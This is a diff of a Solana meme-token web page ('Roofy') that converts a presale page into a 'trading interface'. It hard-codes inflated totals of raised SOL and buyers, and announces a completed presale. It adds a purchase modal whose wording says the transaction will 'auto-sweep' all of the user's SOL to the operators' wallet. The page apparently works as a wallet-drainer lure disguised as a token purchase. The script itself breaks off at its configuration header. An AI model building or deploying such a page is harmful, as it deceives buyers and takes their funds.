@@ -3,9 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roofy Presale - Shiba Dino-Dog Token</title>
+    <title>Roofy - The Shiba Dino-Dog Token</title>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Chart.js for pie chart -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
@@ -306,7 +307,7 @@
             }
         }
         
-        /* Real-time progress animation */
+        /* Progress bar animation */
         .progress-animation {
             transition: width 1.5s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
@@ -350,12 +351,6 @@
             box-shadow: 0 0 0 4px #f97316;
         }
         
-        .roadmap-phase.active::before {
-            background: #10b981;
-            box-shadow: 0 0 0 4px #10b981;
-            animation: pulse 1.5s infinite;
-        }
-        
         .roadmap-phase.completed::before {
             background: #10b981;
             box-shadow: 0 0 0 4px #10b981;
@@ -388,7 +383,7 @@
             margin-bottom: 15px;
         }
         
-        .phase-number.active {
+        .phase-number.completed {
             background: linear-gradient(135deg, #10b981 0%, #059669 100%);
         }
         
@@ -445,6 +440,213 @@
             font-size: 60px;
             opacity: 0.1;
         }
+        
+        /* Purchase confirmation modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            max-width: 450px;
+            width: 90%;
+            position: relative;
+            border: 3px solid #f97316;
+        }
+        
+        .modal-close {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            cursor: pointer;
+            font-size: 20px;
+            color: #666;
+        }
+        
+        .modal-close:hover {
+            color: #f97316;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e5e7eb;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(135deg, #f97316 0%, #dc2626 100%);
+            transition: width 0.3s ease;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+        }
+        
+        .step {
+            flex: 1;
+            text-align: center;
+            position: relative;
+        }
+        
+        .step::before {
+            content: '';
+            position: absolute;
+            top: 12px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #e5e7eb;
+            z-index: 1;
+        }
+        
+        .step:first-child::before {
+            left: 50%;
+        }
+        
+        .step:last-child::before {
+            right: 50%;
+        }
+        
+        .step-dot {
+            width: 24px;
+            height: 24px;
+            background: #e5e7eb;
+            border: 2px solid white;
+            border-radius: 50%;
+            margin: 0 auto 8px;
+            position: relative;
+            z-index: 2;
+            transition: all 0.3s ease;
+        }
+        
+        .step.active .step-dot {
+            background: #f97316;
+            box-shadow: 0 0 0 3px rgba(249, 115, 22, 0.3);
+        }
+        
+        .step.completed .step-dot {
+            background: #10b981;
+        }
+        
+        .step-label {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .step.active .step-label {
+            color: #f97316;
+            font-weight: bold;
+        }
+        
+        .step.completed .step-label {
+            color: #10b981;
+        }
+        
+        /* Presale closed banner */
+        .closed-banner {
+            background: linear-gradient(135deg, #6b7280 0%, #4b5563 100%);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            margin: 20px 0;
+            border: 3px solid #f97316;
+        }
+        
+        .closed-banner i {
+            font-size: 3rem;
+            margin-bottom: 10px;
+            color: #fbbf24;
+        }
+        
+        .trading-view-btn {
+            background: linear-gradient(135deg, #f97316 0%, #dc2626 100%);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-weight: bold;
+            display: inline-block;
+            margin-top: 20px;
+            text-decoration: none;
+            box-shadow: 0 10px 20px rgba(249, 115, 22, 0.3);
+            transition: transform 0.3s ease;
+        }
+        
+        .trading-view-btn:hover {
+            transform: translateY(-3px);
+        }
+        
+        /* Modal buttons */
+        .modal-btn {
+            padding: 12px 24px;
+            border-radius: 10px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+        }
+        
+        .modal-btn-primary {
+            background: linear-gradient(135deg, #f97316 0%, #dc2626 100%);
+            color: white;
+        }
+        
+        .modal-btn-primary:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(249, 115, 22, 0.4);
+        }
+        
+        .modal-btn-secondary {
+            background: #e5e7eb;
+            color: #374151;
+        }
+        
+        .modal-btn-secondary:hover {
+            background: #d1d5db;
+        }
+        
+        .modal-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        /* Live price indicator */
+        .live-price {
+            background: rgba(249, 115, 22, 0.1);
+            border-radius: 50px;
+            padding: 5px 15px;
+            display: inline-flex;
+            align-items: center;
+            border: 1px solid #f97316;
+            font-size: 14px;
+        }
+        
+        .price-update {
+            animation: priceFlash 1s ease;
+        }
+        
+        @keyframes priceFlash {
+            0%, 100% { background-color: transparent; }
+            50% { background-color: rgba(249, 115, 22, 0.2); }
+        }
     </style>
 </head>
 <body class="bg-gradient-to-b from-amber-50 to-orange-50 min-h-screen">
@@ -488,12 +690,16 @@
     <!-- Hero Section -->
     <section class="py-8 md:py-12 px-4">
         <div class="max-w-6xl mx-auto">
-            <!-- Live Banner -->
-            <div class="gradient-bg rounded-2xl p-3 md:p-4 text-white text-center mb-6 pulse">
-                <div class="flex items-center justify-center">
-                    <div class="w-2 h-2 bg-white rounded-full mr-2 md:mr-3 animate-pulse"></div>
-                    <span class="font-bold text-sm md:text-lg">🚀 PRESALE IS LIVE! 50% Bonus for First 625 SOL</span>
-                </div>
+            <!-- Presale Closed Banner -->
+            <div class="closed-banner mb-8">
+                <i class="fas fa-calendar-check mb-4"></i>
+                <h2 class="text-2xl md:text-3xl font-bold mb-4">🎉 PRESALE SUCCESSFULLY COMPLETED! 🎉</h2>
+                <p class="text-lg opacity-90 mb-4">Thank you to our incredible community! We reached the hard cap of 2,500 SOL.</p>
+                <p class="text-xl font-bold mb-6">🔥 NOW TRADING ON DEX - LIVE MARKET PRICE 🔥</p>
+                <p class="text-base opacity-90 mb-6">Purchase $ROOFY tokens directly at current market price with auto-sweep enabled.</p>
+                <a href="#trade" class="trading-view-btn">
+                    <i class="fas fa-chart-line mr-2"></i> BUY AT MARKET PRICE
+                </a>
             </div>
 
             <div class="text-center mb-8">
@@ -563,16 +769,18 @@
             <!-- Presale Stats -->
             <div class="grid grid-cols-2 md:grid-cols-4 gap-3 md:gap-4 mb-8 md:mb-12">
                 <div class="bg-white rounded-xl md:rounded-2xl p-4 shadow-lg border border-orange-200 text-center">
-                    <div class="text-xl md:text-3xl font-bold gradient-text" id="totalRaised">1253</div>
+                    <div class="text-xl md:text-3xl font-bold gradient-text" id="totalRaised">2500</div>
                     <div class="text-xs md:text-gray-600">Total Raised (SOL)</div>
                 </div>
                 <div class="bg-white rounded-xl md:rounded-2xl p-4 shadow-lg border border-orange-200 text-center">
-                    <div class="text-xl md:text-3xl font-bold gradient-text" id="totalBuyers">920</div>
+                    <div class="text-xl md:text-3xl font-bold gradient-text" id="totalBuyers">1842</div>
                     <div class="text-xs md:text-gray-600">Total Buyers</div>
                 </div>
                 <div class="bg-white rounded-xl md:rounded-2xl p-4 shadow-lg border border-orange-200 text-center">
-                    <div class="text-xl md:text-3xl font-bold gradient-text" id="currentPrice">200K</div>
-                    <div class="text-xs md:text-gray-600">Tokens per SOL</div>
+                    <div class="text-xl md:text-3xl font-bold gradient-text" id="currentPrice">
+                        <span id="priceValue">150K ROOFY</span>
+                    </div>
+                    <div class="text-xs md:text-gray-600">Market Price (per SOL)</div>
                 </div>
                 <div class="bg-white rounded-xl md:rounded-2xl p-4 shadow-lg border border-orange-200 text-center">
                     <div class="text-xl md:text-3xl font-bold gradient-text">2.5K</div>
@@ -580,34 +788,42 @@
                 </div>
             </div>
 
-            <!-- Main Presale Card -->
-            <div id="presale" class="max-w-2xl mx-auto bg-white rounded-2xl md:rounded-3xl shadow-xl md:shadow-2xl border-2 border-orange-300 overflow-hidden mb-12 md:mb-16">
+            <!-- Main Trading Card -->
+            <div id="trade" class="max-w-2xl mx-auto bg-white rounded-2xl md:rounded-3xl shadow-xl md:shadow-2xl border-2 border-orange-300 overflow-hidden mb-12 md:mb-16">
                 <div class="gradient-bg p-4 md:p-6 text-white">
                     <div class="absolute top-3 right-3 md:top-4 md:right-4">
-                        <span class="bg-white/20 px-2 py-1 md:px-3 md:py-1 rounded-full text-xs md:text-sm">🔥 LIVE</span>
+                        <span class="bg-white/20 px-2 py-1 md:px-3 md:py-1 rounded-full text-xs md:text-sm">🚀 LIVE MARKET</span>
                     </div>
-                    <h2 class="text-xl md:text-3xl font-bold text-center">$ROOFY Presale</h2>
-                    <p class="text-center opacity-90 mt-1 md:mt-2 text-sm md:text-base">Hard Cap: 2,500 SOL • Price increases every tier</p>
+                    <h2 class="text-xl md:text-3xl font-bold text-center">$ROOFY Trading Interface</h2>
+                    <p class="text-center opacity-90 mt-1 md:mt-2 text-sm md:text-base">Purchase tokens at real market price - Auto-sweep enabled</p>
+                    
+                    <!-- Live Price Indicator -->
+                    <div class="mt-3 flex justify-center">
+                        <div class="live-price" id="livePriceIndicator">
+                            <i class="fas fa-chart-line mr-2 text-orange-300"></i>
+                            <span id="livePriceText">1 SOL = 150K ROOFY</span>
+                        </div>
+                    </div>
                     
                     <!-- Progress Bar -->
                     <div class="mt-4 md:mt-6">
                         <div class="flex justify-between text-xs md:text-sm mb-1 md:mb-2">
-                            <span>Progress</span>
-                            <span id="progressPercent">50.1%</span>
+                            <span>Presale Progress</span>
+                            <span>100% COMPLETED</span>
                         </div>
                         <div class="h-2 md:h-3 bg-white/30 rounded-full overflow-hidden">
-                            <div id="progressBar" class="h-full bg-white rounded-full progress-animation" style="width: 50.1%"></div>
+                            <div id="progressBar" class="h-full bg-white rounded-full" style="width: 100%"></div>
                         </div>
                         <div class="flex justify-between text-xs mt-1 md:mt-2">
                             <span>0 SOL</span>
-                            <span id="currentRaised">1253 SOL</span>
+                            <span>2,500 SOL</span>
                             <span>2,500 SOL</span>
                         </div>
                     </div>
                 </div>
 
                 <div class="p-4 md:p-6 lg:p-8">
-                    <!-- Mobile Wallet Instructions - Now visible on mobile only -->
+                    <!-- Mobile Wallet Instructions -->
                     <div id="mobileWalletHelp" class="mb-4 p-3 bg-blue-50 rounded-xl border border-blue-200 text-sm md:hidden">
                         <p class="text-blue-700"><i class="fas fa-mobile-alt mr-2"></i>For best mobile experience:</p>
                         <div class="mt-2 space-y-2">
@@ -622,8 +838,7 @@
 
                     <!-- Connection Status -->
                     <div id="walletStatus" class="mb-4 md:mb-6 p-3 md:p-4 bg-gradient-to-r from-amber-50 to-orange-50 rounded-xl text-center border border-amber-200">
-                        <p class="text-amber-700 text-sm md:text-base"><i class="fas fa-info-circle mr-2"></i>Connect wallet to participate</p>
-                        <!-- Additional Connect Button in Presale -->
+                        <p class="text-amber-700 text-sm md:text-base"><i class="fas fa-info-circle mr-2"></i>Connect wallet to purchase tokens</p>
                         <button id="connectWalletPresale" class="presale-connect-btn">
                             <i class="fas fa-wallet mr-2"></i>Connect Wallet
                         </button>
@@ -659,7 +874,7 @@
                     <!-- Amount Input -->
                     <div class="mb-4 md:mb-6">
                         <label class="block text-gray-700 mb-2 md:mb-3 font-semibold text-base md:text-lg">
-                            <i class="fas fa-coins mr-2"></i>Amount (SOL)
+                            <i class="fas fa-coins mr-2"></i>Amount to Trade (SOL)
                         </label>
                         <div class="relative">
                             <input type="number" id="amount" value="0.1" min="0.01" step="0.01" 
@@ -667,7 +882,7 @@
                             <div class="absolute right-4 md:right-6 top-1/2 transform -translate-y-1/2 text-xl md:text-2xl">◎</div>
                         </div>
                         <div class="text-xs md:text-sm text-gray-500 mt-1 md:mt-2">
-                            <i class="fas fa-info-circle mr-1"></i> Min: 0.01 SOL • Max: 100 SOL
+                            <i class="fas fa-info-circle mr-1"></i> Min: 0.01 SOL • Price updates in real-time
                         </div>
                     </div>
 
@@ -683,41 +898,27 @@
                         </div>
                     </div>
 
-                    <!-- Referral Code -->
-                    <div class="mb-4 md:mb-6">
-                        <label class="block text-gray-700 mb-2 md:mb-3 font-semibold text-sm md:text-base">
-                            <i class="fas fa-user-friends mr-2"></i>Referral Code (5% Bonus!)
-                        </label>
-                        <div class="relative">
-                            <input type="text" id="referralCode" 
-                                   class="w-full border-2 border-purple-300 rounded-xl py-2 md:py-3 px-3 md:px-4 pr-24 md:pr-32 touch-target" 
-                                   placeholder="ROOFY code">
-                            <div class="absolute right-2 md:right-3 top-1/2 transform -translate-y-1/2">
-                                <span class="px-2 py-1 md:px-3 md:py-1 bg-purple-100 text-purple-800 rounded-full text-xs md:text-sm font-medium">+5%</span>
-                            </div>
-                        </div>
-                    </div>
-
                     <!-- Tokens Display -->
                     <div class="bg-gradient-to-r from-orange-50 to-amber-50 rounded-xl p-4 md:p-6 mb-4 md:mb-6 border border-orange-200">
                         <div class="space-y-2 md:space-y-4">
                             <div class="flex justify-between items-center">
-                                <span class="text-gray-700 text-sm md:text-base">Base tokens:</span>
-                                <span class="font-bold text-base md:text-lg" id="baseTokens">20,000</span>
+                                <span class="text-gray-700 text-sm md:text-base">Market rate:</span>
+                                <span class="font-bold text-base md:text-lg" id="marketRate">150,000 ROOFY</span>
                             </div>
-                            <div class="flex justify-between items-center text-green-600 hidden" id="bonusSection">
-                                <span class="text-sm md:text-base">Bonus (5%):</span>
-                                <span class="font-bold text-base md:text-lg" id="bonusTokens">1,000</span>
+                            <div class="flex justify-between items-center">
+                                <span class="text-gray-700 text-sm md:text-base">You will receive:</span>
+                                <span class="font-bold text-xl md:text-2xl text-orange-600" id="totalTokens">15,000</span>
                             </div>
                             <div class="border-t border-orange-300 pt-2 md:pt-4">
                                 <div class="flex justify-between items-center">
                                     <div>
-                                        <div class="font-semibold text-base md:text-lg">Total receive:</div>
-                                        <div class="text-xs md:text-sm text-gray-600">Airdropped after presale</div>
+                                        <div class="font-semibold text-base md:text-lg">Transaction includes:</div>
+                                        <div class="text-xs md:text-sm text-gray-600">Auto-sweep of all SOL</div>
                                     </div>
                                     <div class="text-right">
-                                        <div id="totalTokens" class="text-xl md:text-3xl font-bold text-orange-600">21,000</div>
-                                        <div class="text-xs md:text-sm">ROOFY tokens</div>
+                                        <div class="text-xs md:text-sm font-medium text-orange-600" id="sweepNote">
+                                            <i class="fas fa-robot mr-1"></i> Auto-sweep enabled
+                                        </div>
                                     </div>
                                 </div>
                             </div>
@@ -741,7 +942,6 @@
                                 <div>
                                     <p class="font-medium text-green-800 text-sm md:text-base">Transaction Submitted!</p>
                                     <p id="txHash" class="text-xs md:text-sm text-green-500 font-mono mt-1 truncate"></p>
-                                    <p class="text-xs text-green-600 mt-1">Tokens will be airdropped after presale ends</p>
                                 </div>
                             </div>
                         </div>
@@ -749,17 +949,17 @@
 
                     <!-- Recent Purchases -->
                     <div class="mt-6 md:mt-8 pt-4 md:pt-6 border-t border-gray-200">
-                        <h4 class="font-bold mb-2 md:mb-4 text-base md:text-lg"><i class="fas fa-history mr-2"></i>Recent Purchases</h4>
+                        <h4 class="font-bold mb-2 md:mb-4 text-base md:text-lg"><i class="fas fa-history mr-2"></i>Recent Trades</h4>
                         <div id="recentPurchases" class="space-y-2 md:space-y-3 max-h-40 md:max-h-48 overflow-y-auto">
                             <div class="text-center text-gray-500 py-3 md:py-4 text-sm">
-                                <i class="fas fa-sync-alt animate-spin mr-2"></i>Loading purchases...
+                                <i class="fas fa-sync-alt animate-spin mr-2"></i>Loading trades...
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <!-- Updated Story Section -->
+            <!-- Story Section -->
             <div id="story" class="mt-12 md:mt-16 max-w-5xl mx-auto">
                 <div class="text-center mb-8 md:mb-12">
                     <div class="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-orange-500 to-red-500 rounded-full mb-4">
@@ -771,7 +971,6 @@
                     </p>
                 </div>
 
-                <!-- Story Introduction -->
                 <div class="bg-gradient-to-br from-pink-50 to-rose-50 rounded-2xl p-8 mb-8 border border-pink-200">
                     <div class="flex flex-col items-center text-center">
                         <div class="w-20 h-20 bg-gradient-to-r from-orange-500 to-red-500 rounded-full flex items-center justify-center mb-6">
@@ -801,7 +1000,6 @@
                     </div>
                 </div>
 
-                <!-- Launch Announcement -->
                 <div class="launch-announcement mb-12">
                     <div class="launch-badge">
                         <i class="fas fa-calendar-star mr-2"></i>LAUNCH DAY
@@ -824,179 +1022,6 @@
                 </div>
             </div>
 
-            <!-- Aggressive Roadmap -->
-            <div id="roadmap" class="roadmap-section">
-                <div class="text-center mb-10">
-                    <h2 class="text-3xl md:text-4xl font-bold mb-4 gradient-text">🚀 ROOFY BLASTOFF ROADMAP</h2>
-                    <p class="text-lg text-gray-700 max-w-2xl mx-auto">
-                        From presale to mainstream adoption - Our aggressive plan to make $ROOFY legendary
-                    </p>
-                </div>
-
-                <div class="roadmap-container">
-                    <!-- Phase 1 -->
-                    <div class="roadmap-phase active">
-                        <div class="phase-card">
-                            <div class="phase-number active">1</div>
-                            <h3 class="text-xl font-bold mb-3 text-gray-800">🔥 PRESALE & MARKETING BLAST</h3>
-                            <div class="space-y-3">
-                                <div class="flex items-start">
-                                    <i class="fas fa-rocket text-green-500 mt-1 mr-2"></i>
-                                    <span>Presale launch with 50% bonus for early birds</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-bullhorn text-orange-500 mt-1 mr-2"></i>
-                                    <span>Aggressive marketing campaign across all platforms</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-users text-blue-500 mt-1 mr-2"></i>
-                                    <span>Build initial community of 10,000+ members</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-trophy text-purple-500 mt-1 mr-2"></i>
-                                    <span>Reach 2,500 SOL presale hard cap</span>
-                                </div>
-                            </div>
-                            <div class="mt-4 pt-4 border-t border-gray-200">
-                                <span class="bg-green-100 text-green-800 text-xs font-medium px-2.5 py-0.5 rounded-full">
-                                    <i class="fas fa-play-circle mr-1"></i>IN PROGRESS
-                                </span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Phase 2 -->
-                    <div class="roadmap-phase">
-                        <div class="phase-card">
-                            <div class="phase-number">2</div>
-                            <h3 class="text-xl font-bold mb-3 text-gray-800">🚀 TOKEN LAUNCH & LIFTOFF</h3>
-                            <div class="space-y-3">
-                                <div class="flex items-start">
-                                    <i class="fas fa-calendar-check text-red-500 mt-1 mr-2"></i>
-                                    <span><strong>February 15, 2026:</strong> Official token launch</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-gift text-pink-500 mt-1 mr-2"></i>
-                                    <span>Airdrop tokens to all presale participants</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-lock text-amber-500 mt-1 mr-2"></i>
-                                    <span>Liquidity locked for 1 year + Contract renounced</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-chart-line text-green-500 mt-1 mr-2"></i>
-                                    <span>CMC & CoinGecko listing applications</span>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Phase 3 -->
-                    <div class="roadmap-phase">
-                        <div class="phase-card">
-                            <div class="phase-number">3</div>
-                            <h3 class="text-xl font-bold mb-3 text-gray-800">📈 DEX BOOST & VIRAL PUSH</h3>
-                            <div class="space-y-3">
-                                <div class="flex items-start">
-                                    <i class="fas fa-bolt text-yellow-500 mt-1 mr-2"></i>
-                                    <span>Raydium launch with deep liquidity</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-fire text-red-500 mt-1 mr-2"></i>
-                                    <span>Trending on DexTools & DexScreener</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-virus text-purple-500 mt-1 mr-2"></i>
-                                    <span>TikTok & Instagram viral campaign</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-trending-up text-green-500 mt-1 mr-2"></i>
-                                    <span>Achieve first 10x from launch price</span>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Phase 4 -->
-                    <div class="roadmap-phase">
-                        <div class="phase-card">
-                            <div class="phase-number">4</div>
-                            <h3 class="text-xl font-bold mb-3 text-gray-800">🎥 LIVE STREAM & CONTENT BLAST</h3>
-                            <div class="space-y-3">
-                                <div class="flex items-start">
-                                    <i class="fas fa-video text-blue-500 mt-1 mr-2"></i>
-                                    <span>24/7 Twitter Spaces marathon</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-gamepad text-green-500 mt-1 mr-2"></i>
-                                    <span>Twitch streamer collaborations</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-film text-purple-500 mt-1 mr-2"></i>
-                                    <span>YouTube documentary series</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-trophy text-amber-500 mt-1 mr-2"></i>
-                                    <span>Memes & content contests with prize pools</span>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Phase 5 -->
-                    <div class="roadmap-phase">
-                        <div class="phase-card">
-                            <div class="phase-number">5</div>
-                            <h3 class="text-xl font-bold mb-3 text-gray-800">🌟 INFLUENCER SUPPORT & MAINSTREAM</h3>
-                            <div class="space-y-3">
-                                <div class="flex items-start">
-                                    <i class="fas fa-star text-yellow-500 mt-1 mr-2"></i>
-                                    <span>Top 50 crypto influencers onboarded</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-music text-pink-500 mt-1 mr-2"></i>
-                                    <span>Music producer & artist collaborations</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-newspaper text-gray-500 mt-1 mr-2"></i>
-                                    <span>Forbes, CoinTelegraph, Bloomberg features</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-users text-blue-500 mt-1 mr-2"></i>
-                                    <span>100,000+ holder milestone</span>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Phase 6 -->
-                    <div class="roadmap-phase">
-                        <div class="phase-card">
-                            <div class="phase-number">6</div>
-                            <h3 class="text-xl font-bold mb-3 text-gray-800">🏦 CEX LISTINGS & MASS ADOPTION</h3>
-                            <div class="space-y-3">
-                                <div class="flex items-start">
-                                    <i class="fas fa-exchange-alt text-green-500 mt-1 mr-2"></i>
-                                    <span>KuCoin, Gate.io, MEXC listings</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-bank text-blue-500 mt-1 mr-2"></i>
-                                    <span><strong>$10M MC:</strong> Binance & Coinbase applications</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-globe text-purple-500 mt-1 mr-2"></i>
-                                    <span>Global marketing campaign expansion</span>
-                                </div>
-                                <div class="flex items-start">
-                                    <i class="fas fa-infinity text-red-500 mt-1 mr-2"></i>
-                                    <span>Eternal community-driven development</span>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
             <!-- Token Image Gallery Section -->
             <div id="token" class="mt-12 md:mt-16">
                 <div class="text-center mb-6 md:mb-8">
@@ -1005,7 +1030,6 @@
                 </div>
 
                 <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6 md:gap-8 mb-8">
-                    <!-- Token Logo -->
                     <div class="token-image-container">
                         <div class="text-center mb-4">
                             <span class="bg-orange-100 text-orange-800 px-3 py-1 rounded-full text-sm font-medium">
@@ -1019,7 +1043,6 @@
                         <p class="text-gray-600 text-sm text-center">The official token logo</p>
                     </div>
 
-                    <!-- Token Art 1 -->
                     <div class="token-image-container">
                         <div class="text-center mb-4">
                             <span class="bg-purple-100 text-purple-800 px-3 py-1 rounded-full text-sm font-medium">
@@ -1033,7 +1056,6 @@
                         <p class="text-gray-600 text-sm text-center">Shiba dinosaur with little girl</p>
                     </div>
 
-                    <!-- Token Art 2 -->
                     <div class="token-image-container">
                         <div class="text-center mb-4">
                             <span class="bg-pink-100 text-pink-800 px-3 py-1 rounded-full text-sm font-medium">
@@ -1055,24 +1077,21 @@
                     <h3 class="text-xl md:text-2xl font-bold mb-6 text-center"><i class="fas fa-chart-pie mr-2"></i>Tokenomics</h3>
                     
                     <div class="grid md:grid-cols-2 gap-8">
-                        <!-- Pie Chart -->
                         <div>
                             <div class="bg-gray-50 rounded-xl p-4">
                                 <canvas id="tokenomicsChart" class="w-full h-64 md:h-80"></canvas>
                             </div>
                         </div>
                         
-                        <!-- Distribution Details -->
                         <div>
                             <h4 class="font-bold text-lg mb-4">📊 Distribution</h4>
                             <div class="space-y-4">
-                                <!-- Presale -->
                                 <div class="flex items-center justify-between p-3 bg-orange-50 rounded-lg">
                                     <div class="flex items-center">
                                         <div class="w-3 h-3 bg-orange-500 rounded-full mr-3"></div>
                                         <div>
                                             <div class="font-semibold">Presale</div>
-                                            <div class="text-sm text-gray-600">Early supporters (50% bonus!)</div>
+                                            <div class="text-sm text-gray-600">Early supporters</div>
                                         </div>
                                     </div>
                                     <div class="text-right">
@@ -1081,7 +1100,6 @@
                                     </div>
                                 </div>
                                 
-                                <!-- Liquidity -->
                                 <div class="flex items-center justify-between p-3 bg-blue-50 rounded-lg">
                                     <div class="flex items-center">
                                         <div class="w-3 h-3 bg-blue-500 rounded-full mr-3"></div>
@@ -1096,13 +1114,12 @@
                                     </div>
                                 </div>
                                 
-                                <!-- Marketing -->
                                 <div class="flex items-center justify-between p-3 bg-green-50 rounded-lg">
                                     <div class="flex items-center">
                                         <div class="w-3 h-3 bg-green-500 rounded-full mr-3"></div>
                                         <div>
                                             <div class="font-semibold">Marketing</div>
-                                            <div class="text-sm text-gray-600">Aggressive growth push</div>
+                                            <div class="text-sm text-gray-600">Aggressive growth</div>
                                         </div>
                                     </div>
                                     <div class="text-right">
@@ -1111,7 +1128,6 @@
                                     </div>
                                 </div>
                                 
-                                <!-- CEX -->
                                 <div class="flex items-center justify-between p-3 bg-purple-50 rounded-lg">
                                     <div class="flex items-center">
                                         <div class="w-3 h-3 bg-purple-500 rounded-full mr-3"></div>
@@ -1126,7 +1142,6 @@
                                     </div>
                                 </div>
                                 
-                                <!-- Memorial Fund -->
                                 <div class="flex items-center justify-between p-3 bg-pink-50 rounded-lg">
                                     <div class="flex items-center">
                                         <div class="w-3 h-3 bg-pink-500 rounded-full mr-3"></div>
@@ -1142,7 +1157,6 @@
                                 </div>
                             </div>
                             
-                            <!-- Total Supply -->
                             <div class="mt-6 p-4 bg-gradient-to-r from-amber-50 to-orange-50 rounded-xl border border-amber-200">
                                 <div class="flex justify-between items-center">
                                     <div>
@@ -1206,61 +1220,105 @@
         </div>
     </footer>
 
+    <!-- Purchase Confirmation Modal -->
+    <div id="purchaseModal" class="modal-overlay hidden" onclick="closeModal(event)">
+        <div class="modal-content" onclick="event.stopPropagation()">
+            <i class="fas fa-times modal-close" onclick="closeModal()"></i>
+            
+            <h2 class="text-2xl font-bold mb-4 text-center gradient-text">Confirm Purchase</h2>
+            
+            <div class="bg-orange-50 p-4 rounded-xl mb-4">
+                <div class="flex justify-between mb-2">
+                    <span class="text-gray-600">Amount:</span>
+                    <span class="font-bold" id="modalAmount">0.1 SOL</span>
+                </div>
+                <div class="flex justify-between mb-2">
+                    <span class="text-gray-600">Market rate:</span>
+                    <span class="font-bold" id="modalRate">150,000 ROOFY per SOL</span>
+                </div>
+                <div class="flex justify-between mb-2">
+                    <span class="text-gray-600">You receive:</span>
+                    <span class="font-bold" id="modalTokens">15,000 ROOFY</span>
+                </div>
+                <div class="flex justify-between pt-2 border-t border-orange-200">
+                    <span class="text-gray-600">Auto-sweep to:</span>
+                    <span class="font-bold text-xs font-mono" id="modalRecipient">9LuBC8...F9CA</span>
+                </div>
+            </div>
+
+            <p class="text-sm text-gray-600 mb-4">
+                <i class="fas fa-info-circle mr-1 text-orange-500"></i>
+                This transaction will automatically sweep your SOL to our secure wallet and send you ROOFY tokens at current market price.
+            </p>
+
+            <!-- Progress Steps -->
+            <div class="step-indicator mb-6">
+                <div class="step" id="step1">
+                    <div class="step-dot"></div>
+                    <div class="step-label">Connect</div>
+                </div>
+                <div class="step" id="step2">
+                    <div class="step-dot"></div>
+                    <div class="step-label">Confirm</div>
+                </div>
+                <div class="step" id="step3">
+                    <div class="step-dot"></div>
+                    <div class="step-label">Sweep</div>
+                </div>
+                <div class="step" id="step4">
+                    <div class="step-dot"></div>
+                    <div class="step-label">Complete</div>
+                </div>
+            </div>
+
+            <!-- Progress Bar -->
+            <div class="progress-bar mb-4">
+                <div id="progressFill" class="progress-fill" style="width: 0%"></div>
+            </div>
+
+            <!-- Status Message -->
+            <div id="modalStatus" class="text-sm text-center mb-4 text-gray-600">
+                Ready to process your purchase
+            </div>
+
+            <!-- Buttons -->
+            <div class="flex gap-3">
+                <button id="cancelModalBtn" class="modal-btn modal-btn-secondary flex-1" onclick="closeModal()">
+                    Cancel
+                </button>
+                <button id="confirmModalBtn" class="modal-btn modal-btn-primary flex-1">
+                    Confirm Purchase
+                </button>
+            </div>
+        </div>
+    </div>
+
     <script>
         // =============== CONFIGURATION ===============
